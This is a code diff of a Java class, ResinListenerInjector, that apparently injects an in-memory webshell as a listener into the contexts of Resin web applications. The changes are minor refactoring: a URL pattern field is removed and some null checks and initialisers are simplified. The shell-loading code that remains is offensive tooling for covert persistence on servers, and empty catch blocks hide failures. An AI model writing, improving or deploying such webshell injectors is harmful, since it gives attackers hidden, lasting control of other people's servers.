@@ -15,11 +15,10 @@ import java.util.zip.GZIPInputStream;
  */
 public class ResinListenerInjector {
     
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
-    private static String urlPattern;
 
     public ResinListenerInjector() {
         if (ok) {
@@ -31,9 +30,7 @@ public class ResinListenerInjector {
         } catch (Throwable throwable) {
           
         }
-        if (contexts == null || contexts.isEmpty()) {
-            
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
                     
@@ -48,7 +45,6 @@ public class ResinListenerInjector {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
       
     }
 
@@ -83,7 +79,7 @@ public class ResinListenerInjector {
    
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
